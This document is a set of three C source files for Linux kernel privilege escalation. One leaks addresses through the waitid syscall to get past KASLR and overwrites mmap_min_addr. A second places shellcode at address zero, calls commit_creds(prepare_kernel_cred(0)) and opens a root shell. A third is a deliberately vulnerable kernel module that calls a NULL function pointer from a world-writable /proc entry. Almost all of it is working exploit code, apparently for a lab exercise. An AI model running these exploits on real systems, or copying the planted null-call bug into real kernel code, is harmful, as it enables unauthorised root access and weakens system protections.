/** disable_map_min_add.c **/
/*
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <syscall.h>

/* offsets might differ, kernel was custom compiled
 * you can read vmlinux and caculate the offset when testing
 */

/*
#define OFFSET_KERNEL_BASE 0x000000
 */
#define MMAP_MIN_ADDR 0x1101de8
#define DAC_MMAP_MIN_ADDR 0xe8e810

/* get kernel functions address by reading /proc/kallsyms */
unsigned long get_kernel_sym(char *name)
{
  FILE *f;
  unsigned long addr;
  char dummy;
  char sname[256];
  int ret = 0;

  f = fopen("/proc/kallsyms", "r");
  if (f == NULL) {
    printf("[-] Failed to open /proc/kallsyms\n");
    exit(-1);
  }
  printf("[+] Find %s...\n", name);
  while(ret != EOF) {
    ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0) {
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fclose(f);
      printf("[+] Found %s at %lx\n", name, addr);
      return addr;
    }
  }
  fclose(f);
  return 0;
}

int main(void)
{
  int pid, pid2, pid3;
  struct rusage rusage = { };
  unsigned long *p, *kernel_base;
  char *mmap_min_addr, *dac_mmap_min_addr;
  pid = fork();
  if (pid > 0) {
    /* try to bypass kaslr when /proc/kallsyms isn't readable */
    syscall(__NR_waitid, P_PID, pid, NULL, WEXITED|WNOHANG|__WNOTHREAD, &rusage);
    printf("[+] Leak size=%d bytes\n", sizeof(rusage));
    for (p = (unsigned long *)&rusage;
	 p < (unsigned long *)((char *)&rusage + sizeof(rusage));
	 p++) {
      printf("[+] Leak point: %p\n", p);
      if (*p > 0xffffffff00000000 && *p < 0xffffffffff000000) {
	p = (unsigned long *)(*p&0xffffffffff000000 /*+ OFFSET_TO_BASE*/); // spender's wouldn't actually work when KASLR was enabled
	break;
      }
    }
    if(p < (unsigned long *)0xffffffff00000000 || p > (unsigned long *)0xffffffffff000000)
      exit(-1);
  } else if (pid == 0) {
    sleep(1);
    exit(0);
  }

  kernel_base = get_kernel_sym("startup_64");
  printf("[+] Got kernel base: %p\n", kernel_base);
  mmap_min_addr = (char *)kernel_base + MMAP_MIN_ADDR;
  printf("[+] Got mmap_min_addr: %p\n", mmap_min_addr);
  dac_mmap_min_addr = (char *)kernel_base + DAC_MMAP_MIN_ADDR;
  printf("[+] Got dac_mmap_min_addr: %p\n", dac_mmap_min_addr);

  pid2 = fork();
  if (pid2 > 0) {
    printf("[+] Overwriting map_min_addr...\n");
    if (syscall(__NR_waitid, P_PID, pid, (siginfo_t *)(mmap_min_addr - 2), WEXITED|WNOHANG|__WNOTHREAD, NULL) < 0) {
      printf("[-] Failed!\n");
      exit(1);
    }
  } else if (pid2 == 0) {
    sleep(1);
    exit(0);
  }

  pid3 = fork();
  if (pid3 > 0) {
    printf("[+] Overwriting dac_mmap_min_addr...\n");
    if (syscall(__NR_waitid, P_PID, pid, (siginfo_t *)(dac_mmap_min_addr - 2), WEXITED|WNOHANG|__WNOTHREAD, NULL) < 0) {
      printf("[-] Failed!\n");
      exit(1);
    }
    printf("[+] map_min_addr disabled!\n");
    exit(0);
  } else if (pid3 == 0) {
    sleep(1);
    exit(0);
  }
  return 0;
}
/** disable_map_min_add.c EOF **/

/** null_poiter_exploit.c **/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <unistd.h>
#include <fcntl.h>

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));

prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;

/* a kernel null pointer derefence will help get privilege
 * /proc/test is a kernel-load module create for testing
 * touch_null_kp can be replace your own implement to
 * touch a kernel null ponit
 */
void touch_null_kp()  {
    printf("[+]Start touch kernel null point\n");

    int *f = open("/proc/test", O_RDONLY);
    read(f, NULL, 0);
}

/* run shell after root */
void get_shell() {
  char *argv[] = {"/bin/sh", NULL};

  if (getuid() == 0){
    printf("[+] Root shell success !! :)\n");
    execve("/bin/sh", argv, NULL);
  }
  printf("[-] failed to get root shell :(\n");
}

/* use for privilige escalation */
void get_root() {
    commit_creds(prepare_kernel_cred(0));
}

/* get function address by reading /proc/kallsyms */
unsigned long get_kernel_sym(char *name)
{
  FILE *f;
  unsigned long addr;
  char dummy;
  char sname[256];
  int ret = 0;

  f = fopen("/proc/kallsyms", "r");
  if (f == NULL) {
    printf("[-] Failed to open /proc/kallsyms\n");
    exit(-1);
  }
  printf("[+] Find %s...\n", name);
  while(ret != EOF) {
    ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0) {
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fclose(f);
      printf("[+] Found %s at %lx\n", name, addr);
      return addr;
    }
  }
  fclose(f);
  return 0;
}

int main(int ac, char **av)
{

  /* get function address */
  prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
  commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");
  printf("Got commit_creds:%p,prepare_kernel_cred%p\n", commit_creds, prepare_kernel_cred);

  /* allocate memory loacate in 0x00 */
  printf("[+] Try to allocat 0x00000000...\n");
  if (mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) == (char *)-1){
    printf("[-] Failed to allocat 0x00000000\n");
    return -1;
  }
  printf("[+] Allocation success !\n");
  /* memset(0, 0xcc, 4096); */
  /*
    //movq rax, 0xffffffff81f3f45a
    //movq [rax], 0
    // it is not nessecc
    mov rax, 0x4242424242424242
    call rax
    xor rax, rax
    ret
    replace 0x4242424242424242 by get_root
    https://defuse.ca/online-x86-assembler.htm#disassembly
     */

  unsigned char shellcode[] =
    { /*0x48, 0xC7, 0xC0, 0x5A, 0xF4, 0xF3, 0x81, *//*0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00,*/ 0x48, 0xB8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3 };
  /* insert the getroot address to shellcode */
  void **get_root_offset = rawmemchr(shellcode, 0x42);
  (*get_root_offset) = get_root;
  /* map shellcode to 0x00 */
  memcpy(0, shellcode, sizeof(shellcode));

  /* jmp to 0x00 */
  touch_null_kp();

  get_shell();

}

/** null_poiter_exploit.c EOF **/

/** test.c **/
#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <asm/ptrace.h>
#include <asm/thread_info.h>

#define MY_DEV_NAME "test"
#define DEBUG_FLAG "PROC_DEV"

extern unsigned long proc_test_sp_print;
static ssize_t proc_read (struct file *proc_file, char __user *proc_user, size_t n, loff_t *loff);
static ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff);
static int proc_open (struct inode *proc_inode, struct file *proc_file);
static struct file_operations a = {
                                .open = proc_open,
                                .read = proc_read,
                                .write = proc_write,
};


static int __init mod_init(void)
{
    struct proc_dir_entry *test_entry;
    const struct file_operations *proc_fops = &a;
    printk(DEBUG_FLAG":proc init start\n");

    test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, NULL, proc_fops);
    if(!test_entry)
       printk(DEBUG_FLAG":there is somethings wrong!\n");

    printk(DEBUG_FLAG":proc init over!\n");
    return 0;
}

static ssize_t proc_read (struct file *proc_file, char *proc_user, size_t n, loff_t *loff)
{
    void (*fun)(void);
    fun = NULL;
    //printk("%s:thread.sp0: %p, task->stack: %p\n", "PROC", current->thread.sp0, current->stack);
    fun();
    //printk("The memory of %p : %d\n", proc_user, *proc_user);
    return 0;
}

static ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff)
{
    printk("%s:thread.sp0: %p, task->stack: %p\n", "PROC", current->thread.sp0, current->stack);
    return 0;
}

int proc_open (struct inode *proc_inode, struct file *proc_file)
{
    printk(DEBUG_FLAG":into open, cmdline:%s!\n", current->comm);
    printk("%s:thread.sp0: %p, task->stack: %p\n", "PROC", current->thread.sp0, current->stack);
    return 0;
}

module_init(mod_init);
/** test.c EOF **/